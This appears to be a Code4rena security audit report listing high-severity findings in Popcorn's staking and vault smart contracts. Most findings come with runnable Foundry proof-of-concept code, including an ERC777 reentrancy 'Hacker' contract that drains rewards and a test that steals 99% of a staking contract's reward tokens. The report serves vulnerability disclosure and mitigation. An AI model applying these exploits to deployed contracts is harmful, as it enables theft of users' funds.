@@ -1,0 +1,247 @@
+[H-01] Any user can drain the entire reward fund in MultiRewardStaking due to incorrect calculation ofsupplierDelta
+Submitted byulqiorra, also found byjoestakey,0Kage, and0xMirce
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L406
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L427
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L274
+Impact
+RewarddeltaIndexin_accrueRewards()is multiplied by10**decimals()but eventually divided byrewards.ONE(which is equal to10**IERC20Metadata(address(rewardToken)).decimals()) in_accrueUser().
+If the number of decimals in MultiRewardEscrow share token differs from the number of decimals in the reward token, then all rewards are multipled by10 ** (decimals() - rewardToken.decimals()).
+Therefore, for example, if an admin adds USDT as the reward token with decimals=6, it will result in the reward for any user to be multiplied by10**(18-6) = 1000000000000on the next block. This will at best lead to a DOS where no one will be able to withdraw funds. But at worst, users will drain the entire reward fund due to inflated calculations in the next block.
+Proof of Concept
+Put the following test in./test/folder and run withforge test --mc DecimalMismatchTest. The test fails because of incorrectsupplierDeltacalculations:
+// SPDX-License-Identifier: GPL-3.0// Docgen-SOLC: 0.8.15pragmasolidity^0.8.15;import{Test}from"forge-std/Test.sol";import{SafeCastLib}from"solmate/utils/SafeCastLib.sol";import{MockERC20}from"./utils/mocks/MockERC20.sol";import{IMultiRewardEscrow}from"../src/interfaces/IMultiRewardEscrow.sol";import{MultiRewardStaking,IERC20}from"../src/utils/MultiRewardStaking.sol";import{MultiRewardEscrow}from"../src/utils/MultiRewardEscrow.sol";contractDecimalMismatchTestisTest{usingSafeCastLibforuint256;MockERC20stakingToken;MockERC20rewardToken;MultiRewardStakingstaking;MultiRewardEscrowescrow;addressalice=address(0xABCD);addressbob=address(0xDCBA);addressfeeRecipient=address(0x9999);functionsetUp()public{vm.label(alice,"alice");vm.label(bob,"bob");// staking token has 18 decimalsstakingToken=newMockERC20("Staking Token","STKN",18);// reward token has 6 decimals (for example USDT)rewardToken=newMockERC20("RewardsToken1","RTKN1",6);escrow=newMultiRewardEscrow(address(this),feeRecipient);staking=newMultiRewardStaking();staking.initialize(IERC20(address(stakingToken)),IMultiRewardEscrow(address(escrow)),address(this));rewardToken.mint(address(this),1000ether);rewardToken.approve(address(staking),1000ether);staking.addRewardToken(// rewardTokenIERC20(address(rewardToken)),// rewardsPerSecond1e10,// amount1e18,// useEscrowfalse,// escrowPercentage0,// escrowDuration0,// offset0);}functiontestWrongSupplierDelta()public{stakingToken.mint(address(bob),1);vm.prank(bob);stakingToken.approve(address(staking),1);vm.prank(bob);staking.deposit(1);assert(staking.balanceOf(bob) ==1);vm.warp(block.timestamp+1);IERC20[]memorya=newIERC20[](1);a[0] =IERC20(address(rewardToken));vm.prank(bob);// 1 second elapsed, so Bob must get a little reward// but instead this will REVERT with "ERC20: transfer amount exceeds balance"// because the `supplierDelta` is computed incorrect and becomes too largestaking.claimRewards(bob,a);}}
+Recommended Mitigation Steps
+Use the same number of decimals when calculatingdeltaIndexandsupplierDelta.
+RedVeil (Popcorn) confirmed
+
+[H-02]BeefyAdapter()malicious vault owner can use malicious\_beefyBoosterto steal the adapter’s token
+Submitted bybin2chen, also found byCh_301,rvierdiiev, and0xTraub
+Malicious vault owner can use Malicious\_beefyBoosterto steal the adapter’s token.
+Proof of Concept
+When creating a BeefyAdapter, the vault owner can specify the\_beefyBooster.
+The current implementation does not check if the\_beefyBoosteris legitimate or not, and worse, it\_beefyVault.approveto the\_beefyBoosterduring initialization.
+The code is as follows:
+contractBeefyAdapterisAdapterBase,WithRewards{...functioninitialize(bytesmemoryadapterInitData,addressregistry,bytesmemorybeefyInitData)externalinitializer{(address_beefyVault,address_beefyBooster) =abi.decode(beefyInitData,//@audit <--------- beefyInitData comes from the owner's input: adapterData.data(address,address));//@audit <-------- not check _beefyBooster is legalif(_beefyBooster!=address(0) &&IBeefyBooster(_beefyBooster).stakedToken() !=_beefyVault)revertInvalidBeefyBooster(_beefyBooster);...if(_beefyBooster!=address(0))IERC20(_beefyVault).approve(_beefyBooster,type(uint256).max);//@audit <---------  _beefyVault approve _beefyBooster}function_protocolDeposit(uint256amount,uint256)internalvirtualoverride{beefyVault.deposit(amount);if(address(beefyBooster) !=address(0))beefyBooster.stake(beefyVault.balanceOf(address(this)));//@audit <--------- A malicious beefyBooster can transfer the token}
+As a result, a malicious user can pass a malicious\_beefyBoostercontract, and when the user deposits to the vault, the vault is saved to the\_beefyVault.
+This malicious\_beefyBoostercan execute\_beefyVault.transferFrom(BeefyAdapter), and take all the tokens stored by the adapter to\_beefyVault.
+Recommended Mitigation Steps
+Check\_beefyBoosterjust like you check\_beefyVault:
+functioninitialize(bytesmemoryadapterInitData,addressregistry,bytesmemorybeefyInitData)externalinitializer{...if(!IPermissionRegistry(registry).endorsed(_beefyVault))revertNotEndorsed(_beefyVault);...+if(!IPermissionRegistry(registry).endorsed(_beefyBooster))+revertNotEndorsed(_beefyBooster);if(_beefyBooster!=address(0) &&IBeefyBooster(_beefyBooster).stakedToken() !=_beefyVault)revertInvalidBeefyBooster(_beefyBooster);
+RedVeil (Popcorn) confirmed
+
+[H-03] Incorrect Reward Duration After Change in Reward Speed in MultiRewardStaking
+Submitted bywaldenyan20, also found by0xRobocop,minhtrng,hansfriese,KIntern_NA,mert_eren,peanuts,cccz, andRuhum
+When the reward speed is changed inMultiRewardStaking, the new end time is calculated based off of the balance of the reward token owned by the contract. This, however, is not the same as the number of reward tokens that are left to be distributed since some of those tokens may be owed to users who have not collected their rewards yet. As a result, some users may benefit from earning rewards past the end of the intended reward period, and leaving the contract unable to pay the rewards it owes other users.
+Proof of Concept
+A simple Foundry test I wrote demonstrates that the contracts fail to calculate the rewards properly after the reward speed is changed:
+// SPDX-License-Identifier: GPL-3.0// Docgen-SOLC: 0.8.15pragma solidity ^0.8.15;import { Test } from "forge-std/Test.sol";import { SafeCastLib } from "solmate/utils/SafeCastLib.sol";import { MockERC20 } from "./utils/mocks/MockERC20.sol";import { IMultiRewardEscrow } from "../src/interfaces/IMultiRewardEscrow.sol";import { MultiRewardStaking, IERC20 } from "../src/utils/MultiRewardStaking.sol";import { MultiRewardEscrow } from "../src/utils/MultiRewardEscrow.sol";contract AuditTest is Test {using SafeCastLib for uint256;MockERC20 stakingToken;MockERC20 rewardToken1;MockERC20 rewardToken2;IERC20 iRewardToken1;IERC20 iRewardToken2;MultiRewardStaking staking;MultiRewardEscrow escrow;address alice = address(0xABCD);address bob = address(0xDCBA);address feeRecipient = address(0x9999);bytes32 constant PERMIT_TYPEHASH =keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");event RewardInfoUpdate(IERC20 rewardsToken, uint160 rewardsPerSecond, uint32 rewardsEndTimestamp);event RewardsClaimed(address indexed user, IERC20 rewardsToken, uint256 amount, bool escrowed);function setUp() public {vm.label(alice, "alice");vm.label(bob, "bob");stakingToken = new MockERC20("Staking Token", "STKN", 18);rewardToken1 = new MockERC20("RewardsToken1", "RTKN1", 18);rewardToken2 = new MockERC20("RewardsToken2", "RTKN2", 18);iRewardToken1 = IERC20(address(rewardToken1));iRewardToken2 = IERC20(address(rewardToken2));escrow = new MultiRewardEscrow(address(this), feeRecipient);staking = new MultiRewardStaking();staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));}function _addRewardToken(MockERC20 rewardsToken) internal {rewardsToken.mint(address(this), 10 ether);rewardsToken.approve(address(staking), 10 ether);staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);}function test__endtime_after_change_reward_speed() public {_addRewardToken(rewardToken1);stakingToken.mint(alice, 1 ether);stakingToken.mint(bob, 1 ether);vm.prank(alice);stakingToken.approve(address(staking), 1 ether);vm.prank(bob);stakingToken.approve(address(staking), 1 ether);vm.prank(alice);staking.deposit(1 ether);// 50% of rewards paid outvm.warp(block.timestamp + 50);vm.prank(alice);staking.withdraw(1 ether);assertEq(staking.accruedRewards(alice, iRewardToken1), 5 ether);// Double Accrual (from original)staking.changeRewardSpeed(iRewardToken1, 0.2 ether); // Twice as fast nowvm.prank(bob);staking.deposit(1 ether);// The remaining 50% of rewards paid outvm.warp(block.timestamp + 200);vm.prank(bob);staking.withdraw(1 ether);assertEq(staking.accruedRewards(bob, iRewardToken1), 5 ether);}}
+The output of the test demonstrates an incorrect calculation:
+[FAIL. Reason: Assertion failed.] test__endtime_after_change_reward_speed() (gas: 558909)Logs:Error: a == b not satisfied [uint]Expected: 5000000000000000000Actual: 20000000000000000000Test result: FAILED. 0 passed; 1 failed; finished in 6.12ms
+Notice that the amount of reward tokens given to Bob is more than the amount owned by the contract!
+Tools Used
+I reproduced the bug simply by adding a test within the existing Foundry project.
+Recommended Mitigation Steps
+There is a nice accounting trick to make sure the remaining time is calculated correctly without needing to keep track of how much you owe to users that has not been paid out yet. I would suggest changing the vulnerable code inchangeRewardSpeedto:
+uint32 prevEndTime = rewards.rewardsEndTimestamp;uint256 remainder = prevEndTime > block.timestamp ? (uint256(prevEndTime) - block.timestamp) * rewards.rewardsPerSecond : 0;uint32 rewardsEndTimestamp = _calcRewardsEnd(block.timestamp.safeCastTo32(),rewardsPerSecond,remainder);
+RedVeil (Popcorn) confirmed, but disagreed with severity
+
+[H-04] Staking rewards can be drained
+Submitted by0xdeadbeef0x, also found byapvlki,ulqiorra,immeas,fs0c,gjaldon,Aymen0909,SadBase,hansfriese,KIntern_NA,Krace,aashar,0xNazgul,mrpathfindr,btk,mert_eren,Kumpa,waldenyan20,Kenshin,y1cunhui,KingNFT,0Kage,rvi0x,0xRobocop,eccentricexit,supernova,critical-or-high,peanuts,rvierdiiev,cccz,mgf15, andorion
+If ERC777 tokens are used for rewards, the entire balance of rewards in the staking contract can get drained by an attacker.
+Proof of Concept
+ERC777 allow users to register a hook to notify them when tokens are transferred to them.
+This hook can be used to reenter the contract and drain the rewards.
+The issue is in theclaimRewardsinMultiRewardStaking.
+The function does not follow the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop.https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L170-L187
+function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {for (uint8 i; i < _rewardTokens.length; i++) {uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];if (escrowInfo.escrowPercentage > 0) {_lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);} else {_rewardTokens[i].transfer(user, rewardAmount);emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);}accruedRewards[user][_rewardTokens[i]] = 0;}
+As can be seen above, the clearing of theaccruedRewardsis done AFTER the transfer when it should be BEFORE the transfer.
+Foundry POC
+The POC demonstrates an end-to-end attack including a malicious hacker contract that steals the balance of the reward token.
+Add the following file (drainRewards.t.sol) to the test directory:https://github.com/code-423n4/2023-01-popcorn/tree/main/test
+// SPDX-License-Identifier: GPL-3.0// Docgen-SOLC: 0.8.15pragma solidity ^0.8.15;import { Test } from "forge-std/Test.sol";import { MockERC20 } from "./utils/mocks/MockERC20.sol";import { IMultiRewardEscrow } from "../src/interfaces/IMultiRewardEscrow.sol";import { MultiRewardStaking, IERC20 } from "../src/utils/MultiRewardStaking.sol";import { MultiRewardEscrow } from "../src/utils/MultiRewardEscrow.sol";import { ERC777 } from "openzeppelin-contracts/token/ERC777/ERC777.sol";contract MockERC777 is ERC777 {uint8 internal _decimals;mapping(address => address) private registry;constructor() ERC777("MockERC777", "777", new address[](0)) {}function decimals() public pure override returns (uint8) {return uint8(18);}function mint(address to, uint256 value) public virtual {_mint(to, value, hex'', hex'', false);}function burn(address from, uint256 value) public virtual {_mint(from, value, hex'', hex'');}}contract Hacker {IERC20[] public rewardsTokenKeys;MultiRewardStaking staking;constructor(IERC20[] memory _rewardsTokenKeys, MultiRewardStaking _staking){rewardsTokenKeys = _rewardsTokenKeys;staking = _staking;// register hookbytes32 erc777Hash = keccak256("ERC777TokensRecipient");bytes memory data = abi.encodeWithSignature("setInterfaceImplementer(address,bytes32,address)", address(this), erc777Hash, address(this));address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).call(data);}// deposit into stakingfunction approveAndDeposit() external {IERC20 stakingToken = IERC20(staking.asset());stakingToken.approve(address(staking), 1 ether);staking.deposit(1 ether);}function startHack() external {// Claim and reenter until staking contract is drainedstaking.claimRewards(address(this), rewardsTokenKeys);}function tokensReceived(address operator,address from,address to,uint256 amount,bytes calldata userData,bytes calldata operatorData) external {// continue as long as the balance of the reward token is positive// In real life, we should check the lower boundry to prevent a revert// when trying to send more then the balance.if(ERC777(msg.sender).balanceOf(address(staking)) > 0){staking.claimRewards(address(this), rewardsTokenKeys);}}}contract DrainRewards is Test {MockERC20 stakingToken;MockERC777 rewardToken1;IERC20 iRewardToken1;MultiRewardStaking staking;MultiRewardEscrow escrow;address feeRecipient = address(0x9999);function setUp() public {stakingToken = new MockERC20("Staking Token", "STKN", 18);rewardToken1 = new MockERC777();iRewardToken1 = IERC20(address(rewardToken1));escrow = new MultiRewardEscrow(address(this), feeRecipient);staking = new MultiRewardStaking();staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));}function _addRewardToken(MockERC777 rewardsToken) internal {rewardsToken.mint(address(this), 10 ether);rewardsToken.approve(address(staking), 10 ether);staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);}function test__claim_reentrancy() public {// Prepare array for `claimRewards`IERC20[] memory rewardsTokenKeys = new IERC20[](1);rewardsTokenKeys[0] = iRewardToken1;// setup hacker contractHacker hacker = new Hacker(rewardsTokenKeys, staking);address hackerAddr = address(hacker);stakingToken.mint(hackerAddr, 1 ether);hacker.approveAndDeposit();// Add reward token to staking_addRewardToken(rewardToken1);// 10% of rewards paid outvm.warp(block.timestamp + 10);// Get the full rewards held by the staking contractuint256 full_rewards_amount = iRewardToken1.balanceOf(address(staking));// Call hacker to start claiming the rewards and reenterhacker.startHack();// validate we received 100% of rewards (10 eth)assertEq(rewardToken1.balanceOf(hackerAddr), full_rewards_amount);}}
+To run the POC, execute the following command:
+forge test -m "test__claim_reentrancy" --fork-url=<MAINNET FORK>
+Expected results:
+Running 1 test for test/drainRewards.t.sol:DrainRewards[PASS] test__claim_reentrancy() (gas: 1018771)Test result: ok. 1 passed; 0 failed; finished in 6.46s
+Tools Used
+Foundry, VS Code
+Recommended Mitigation Steps
+Follow the checks-effects-interactions pattern and clear outaccruedRewards[user][_rewardTokens[i]]before transferring.
+Additionally, it would be a good idea to add a ReentrancyGuard modifier to the function.
+RedVeil (Popcorn) confirmed, but disagreed with severity
+
+[H-05] Malicious strategy can lead to loss of funds
+Submitted by7siech, also found byimareandfs0c
+A malicious strategy has access to the adapter’s storage and can therefore freely change any values.
+Proof of Concept
+BecauseAdapterBasecalls theStrategyusingdelegatecall, theStrategyhas access to the calling contract’s storage and can be manipulated directly.
+In the following proof of concept, aMaliciousStrategyis paired with theBeefyAdapterand when called will manipulate theperformanceFeeandhighWaterMarkvalues. Of course, any other storage slots of the adapter could also be manipulated or any other calls to external contracts on behalf of themsg.sendercould be performed.
+MaliciousStrategyimplementation showing the exploit -https://gist.github.com/alpeware/e0b1c9f330419986142711e814bfdc7b#file-beefyadapter-t-sol-L18
+Adapterhelper used to determine the storage slots -https://gist.github.com/alpeware/e0b1c9f330419986142711e814bfdc7b#file-beefyadapter-t-sol-L65
+BeefyAdapterTestchanges made to tests -
+Adding the malicious strategy -https://gist.github.com/alpeware/e0b1c9f330419986142711e814bfdc7b#file-beefyadapter-t-sol-L123
+Adding new testtest__StrategyHarvest()executingharvest()-https://gist.github.com/alpeware/e0b1c9f330419986142711e814bfdc7b#file-beefyadapter-t-sol-L132
+Log output -https://gist.github.com/alpeware/e0b1c9f330419986142711e814bfdc7b#file-log-txt
+Tools Used
+Foundry
+Recommended Mitigation Steps
+From chatting with the devs, the goal is to mix and match adapters and strategies. I don’t thinkdelegatecallshould be used and adapters and strategies should be treated as separate contracts. Relevant approvals should be given individually instead.
+RedVeil (Popcorn) acknowledged
+
+[H-06] Lost Rewards in MultiRewardStaking Upon Third-Party Withdraw
+Submitted bywaldenyan20, also found byulqiorra,hansfriese, andKingNFT
+Affected contract:MultiRewardStaking
+When assets are withdrawn for userAliceby an approved userBobto a receiver that is notAlice, the rewards are never accrued and the resultingstaking rewards are lost forever. This is becauseaccrueRewardsis called oncallerandreceiverbut neverowner.
+Third-party withdrawals are allowed by the fact thatwithdraw(uint256, address, address)exists inERC4626Upgradeableand is never overwritten by a method with the same signature. Protocols composing with Popcorn will assume by the nature of this contract being anERC4626that this method is safe to use when it in fact costs the user significantly.
+Proof of Concept
+I created a test to reproduce this bug. When I included the below code withinMultiRewardStaking.t.solit passed, meaning Alice and Bob both had no rewards to claim by the end:
+function test__withdraw_bug() public {// Add a reward token_addRewardToken(rewardToken1); // adds at 0.1 per second// Make a deposit for AlicestakingToken.mint(alice, 1 ether);vm.prank(alice);stakingToken.approve(address(staking), 1 ether);assertEq(stakingToken.allowance(alice, address(staking)), 1 ether);assertEq(staking.balanceOf(alice), 0);vm.prank(alice);staking.deposit(1 ether);assertEq(staking.balanceOf(alice), 1 ether);// Move 10 seconds into the futurevm.warp(block.timestamp + 10); // 1 ether should be owed to Alice in rewards// Approve Bob for withdrawalvm.prank(alice);staking.approve(bob, 1 ether);// Bob withdraws to himselfvm.prank(bob);staking.withdraw(1 ether, bob, alice);assertEq(staking.balanceOf(alice), 0);assertEq(stakingToken.balanceOf(bob), 1 ether);IERC20[] memory rewardsTokenKeys = new IERC20[](1);rewardsTokenKeys[0] = iRewardToken1;// Alice has no rewards to claimvm.prank(alice);vm.expectRevert(abi.encodeWithSelector(MultiRewardStaking.ZeroRewards.selector, iRewardToken1));staking.claimRewards(alice, rewardsTokenKeys);// Bob has no rewards to claimvm.prank(bob);vm.expectRevert(abi.encodeWithSelector(MultiRewardStaking.ZeroRewards.selector, iRewardToken1));staking.claimRewards(bob, rewardsTokenKeys);}
+One can similarly create a test that doesn’t expect the calls at the end to revert and that test will fail.
+Tools Used
+I reproduced the bug simply by adding a test within the existing Foundry project.
+Recommended Mitigation Steps
+Fix the code by changingthis line of codein_withdrawto instead call_accrueRewards(owner, receiver). It is okay to not accrue the rewards oncallersince the caller neither gains nor loses staked tokens.Add a similar test as above inMultiRewardStaking.t.solthatwill failif Alice is unable to withdraw1 etherof rewards in the end.
+RedVeil (Popcorn) confirmed, but disagreed with severity
+
+[H-07] Anyone who uses same adapter has the ability to pause it
+Submitted byrvierdiiev, also found bybin2chen
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L605-L615
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L575
+Impact
+Anyone who uses same adapter has the ability to pause it. As result you have the ability to pause any vault by creating your vault with the same adapter.
+When a user creates vault, he has the ability to deploy new adapter orreuse already created adapter.
+VaultController gives ability to pause adapter.
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L605-L615
+functionpauseAdapters(address[]calldatavaults)external{uint8len=uint8(vaults.length);for(uint256i=0;i<len;i++) {_verifyCreatorOrOwner(vaults[i]);(boolsuccess,bytesmemoryreturnData) =adminProxy.execute(IVault(vaults[i]).adapter(),abi.encodeWithSelector(IPausable.pause.selector));if(!success)revertUnderlyingError(returnData);}}
+As you can see_verifyCreatorOrOwneris used to determine if msg.sender can pause adapter.
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L667-L670
+function_verifyCreatorOrOwner(addressvault)internalreturns(VaultMetadatamemorymetadata) {metadata=vaultRegistry.getVault(vault);if(msg.sender!=metadata.creator||msg.sender!=owner)revertNotSubmitterNorOwner(msg.sender);}
+So in case if you are creator of vault that uses adaptor that you want to pause, then you are able to pause it.
+This is how it can be used in order to stop the vault.
+Someone created vault that uses adapterA.Attacker creates own vault and sets adapterA as well.Now attacker is able to pause adapterA and as result it’s not possible to deposit anymore. Also vault is not earning fees now, as pausingwithdraws all from strategy.And it can pause it as many times as he wants (in case if someone else will try to unpause it).
+So this attack allows to stop all vaults that use same adapter from earning yields.
+Tools Used
+VS Code
+Recommended Mitigation Steps
+I think that it’s better to create a clone of adapter for the vault, so each vault has separate adapter.
+RedVeil (Popcorn) acknowledged, but disagreed with severity
+
+[H-08] Attacker can deploy vaults with a malicious Staking contract
+Submitted bygjaldon, also found byCh_301,KIntern_NA, andmookimgo
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L110
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultRegistry.sol#L44-L53
+Impact
+Anyone can deploy a Vault with a malicious Staking contract attached. If the Staking contract already exists, we can just pass its address todeployVaultand no checks will be applied to see whether the Staking contract matches valid Staking templates in the Template Registry.
+An attacker can create malicious Staking contract that acts like a regular ERC-4626 vault but with a backdoor function that allows them to withdraw all the deposited funds in the contract. Users may assume the Staking contract is valid and safe and will deposit their funds into it. This will lead to loss of funds for users and huge loss of credibility for the protocol.
+Proof of Concept
+The below PoC shows the behavior described above where any Staking contract can be deployed with a Vault. The below lines will need to be added to theVaultController.t.solfile.
+functiontest__deploy_malicious_staking_contract()public{addTemplate("Adapter",templateId,adapterImpl,true,true);addTemplate("Strategy","MockStrategy",strategyImpl,false,true);addTemplate("Vault","V1",vaultImpl,true,true);// Pretend this malicious Staking contract allows attacker to withdraw// all the funds from it while allowing users to use it like a normal Staking contractMultiRewardStakingmaliciousStaking=newMultiRewardStaking();vm.startPrank(alice);addressvault=controller.deployVault(VaultInitParams({asset:iAsset,adapter:IERC4626(address(0)),fees:VaultFees({deposit:100,withdrawal:200,management:300,performance:400}),feeRecipient:feeRecipient,owner:address(this)}),DeploymentArgs({id:templateId,data:abi.encode(uint256(100)) }),DeploymentArgs({id:0,data:""}),address(maliciousStaking),"",VaultMetadata({vault:address(0),staking:address(maliciousStaking),creator:alice,metadataCID:metadataCid,swapTokenAddresses:swapTokenAddresses,swapAddress:address(0x5555),exchange:uint256(1)}),0);vm.stopPrank();assertEq(vaultRegistry.getVault(vault).staking,address(maliciousStaking));}
+The test can be run with the following command:forge test --no-match-contract 'Abstract' --match-test test__deploy_malicious_staking_contract
+Tools Used
+VS Code, Foundry
+Recommended Mitigation Steps
+Add checks to verify that the Staking contract being used indeployVaultis a Staking contract that was deployed by the system and uses an approved template:
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L110
+RedVeil (Popcorn) confirmed
+
+[H-09] Attacker can steal 99% of total balance from any reward token in any Staking contract
+Submitted bygjaldon
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L483-L503
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L296-L315
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L377-L378
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L390-L399
+Impact
+Attacker can steal 99% of the balance of a reward token of any Staking contract in the blockchain. An attacker can do this by modifying the reward speed of the target reward token.
+So an attacker gets access tochangeRewardSpeed, he will need to deploy a vault using the target Staking contract as its Staking contract. Since the Staking contract is now attached to the attacker’s created vault, he can now successfullychangeRewardSpeed. Now withchangeRewardSpeed, attacker can set therewardSpeedto any absurdly large amount that allows them to drain 99% of the balance (dust usually remains due to rounding issues) after some seconds (12 seconds in the PoC.)
+Proof of Concept
+This attack is made possible by the following issues:
+Any user can deploy a Vault that uses any existing Staking contract -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108As long as attacker is creator of a Vault that has the target Staking contract attached to it, attacker can callchangeStakingRewardSpeedsto modify the rewardSpeeds of any reward tokens in the target Staking contract -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L495-L501There are no checks for limits on therewardsPerSecondvalue inchangeRewardSpeedso attacker can set any amount they want -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314changeRewardSpeedalso uses_calcRewardsEndto get the newrewardsEndTimestampbut that calculation is faulty and the new timestamp is always longer than it’s supposed to be leading to people being able to claim more rewards than they should get -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360
+Below is the PoC using a Foundry test:
+functiontest__steal_rewards_from_any_staking_contract()public{addTemplate("Adapter",templateId,adapterImpl,true,true);addTemplate("Strategy","MockStrategy",strategyImpl,false,true);addTemplate("Vault","V1",vaultImpl,true,true);// 1. deploy regular legit vault owned by thisaddressvault=deployVault();addressstaking=vaultRegistry.getVault(vault).staking;rewardToken.mint(staking,1_000_000ether);vm.startPrank(bob);asset.mint(bob,10000ether);asset.approve(vault,10000ether);IVault(vault).deposit(10000ether,bob);IVault(vault).approve(staking,10000ether);IMultiRewardStaking(staking).deposit(9900ether,bob);vm.stopPrank();vm.startPrank(alice);// 2. deploy attacker-owned vault using the same Staking contract as legit vault// alice is the attackeraddressattackerVault=controller.deployVault(VaultInitParams({asset:iAsset,adapter:IERC4626(address(0)),fees:VaultFees({deposit:100,withdrawal:200,management:300,performance:400}),feeRecipient:feeRecipient,owner:address(this)}),DeploymentArgs({id:templateId,data:abi.encode(uint256(100)) }),DeploymentArgs({id:0,data:""}),staking,"",VaultMetadata({vault:address(0),staking:staking,creator:alice,metadataCID:metadataCid,swapTokenAddresses:swapTokenAddresses,swapAddress:address(0x5555),exchange:uint256(1)}),0);asset.mint(alice,10ether);asset.approve(vault,10ether);IVault(vault).deposit(10ether,alice);IVault(vault).approve(staking,10ether);IMultiRewardStaking(staking).deposit(1ether,alice);address[]memorytargets=newaddress[](1);targets[0] =attackerVault;IERC20[]memoryrewardTokens=newIERC20[](1);rewardTokens[0] =iRewardToken;uint160[]memoryrewardsSpeeds=newuint160[](1);rewardsSpeeds[0] =990_099_990ether;controller.changeStakingRewardsSpeeds(targets,rewardTokens,rewardsSpeeds);assertGt(rewardToken.balanceOf(staking),1_000_000ether);vm.warp(block.timestamp+12);MultiRewardStaking(staking).claimRewards(alice,rewardTokens);assertGt(rewardToken.balanceOf(alice),999_999ether);assertLt(1ether,rewardToken.balanceOf(staking));vm.stopPrank();}
+The PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract.)
+Note that the attacker can tweak the amount they stake in the contract, the reward speed they’ll use, and the seconds to wait before, before claiming rewards. All of those things have an effect on the cost of the attack and how much can be drained.
+The test can be run with:forge test --no-match-contract 'Abstract' --match-test test__steal_rewards_from_any_staking_contract
+Tools Used
+VS Code, Foundry
+Recommended Mitigation Steps
+Don’t allow any Vault creator to use and modify just ANY Staking contract -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108Add checks to limit how highrewardsPerSecondcan be when changing rewardSpeed. Maybe make it so that it takes a minimum of 1 month (or some other configurable period) for rewards to be distributed. -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314Fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time -https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360
+RedVeil (Popcorn) confirmed
+
+[H-10] First vault depositor can steal other’s assets
+Submitted by0xNineDec, also found by0xBeirao,peanuts,immeas,nadin,Breeje,Qeew,Josiah,RaymondFam,0xNazgul,rbserver,KIntern_NA,giovannidisiena,MyFDsYours,koxuan,gjaldon,Blockian,savi0ur,0xRajkumar,CRYP70,chaduke,Ruhum,rvi0x, andUdarTeam
+The first depositor can be front run by an attacker and as a result will lose a considerable part of the assets provided.
+The vault calculates the amount of shares to be minted upon deposit to every user via theconvertToShares()function:
+functiondeposit(uint256assets,addressreceiver)publicnonReentrantwhenNotPausedsyncFeeCheckpointreturns(uint256shares){if(receiver==address(0))revertInvalidReceiver();uint256feeShares=convertToShares(assets.mulDiv(uint256(fees.deposit),1e18,Math.Rounding.Down));shares=convertToShares(assets) -feeShares;if(feeShares>0)_mint(feeRecipient,feeShares);_mint(receiver,shares);asset.safeTransferFrom(msg.sender,address(this),assets);adapter.deposit(assets,address(this));emitDeposit(msg.sender,receiver,assets,shares);}functionconvertToShares(uint256assets)publicviewreturns(uint256) {uint256supply=totalSupply();// Saves an extra SLOAD if totalSupply is non-zero.returnsupply==0?assets:assets.mulDiv(supply,totalAssets(),Math.Rounding.Down);}
+When the pool has no share supply, the amount of shares to be minted is equal to the assets provided. An attacker can abuse this situation and profit off the rounding down operation when calculating the amount of shares if the supply is non-zero. This attack is enabled by the following components: frontrunning, rounding down the amount of shares calculated and regular ERC20 transfers.
+Proof of Concept
+The Vault charges zero fees to conduct any action.
